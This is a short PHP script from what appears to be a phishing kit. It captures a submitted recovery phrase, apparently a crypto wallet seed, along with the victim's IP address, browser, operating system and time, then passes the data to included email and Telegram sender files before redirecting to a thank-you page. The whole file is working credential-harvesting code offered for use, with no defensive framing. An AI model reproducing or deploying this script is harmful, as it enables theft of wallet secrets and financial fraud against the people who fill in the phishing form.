<?php

session_start();

if(isset($_POST['ph'])) 
{

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$ph = $_SESSION['ph'] = $_POST['ph'];



$yagmai .= '
[👤 Phrase ] = '.$_SESSION['ph'].'
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


include("sand_email.php"); 
include("Add_Your_TelegramAPi.php");

$src="../Thanks.php";
header("location:$src");

}

else {
$src="../Login.html";
header("location:$src");
}

?>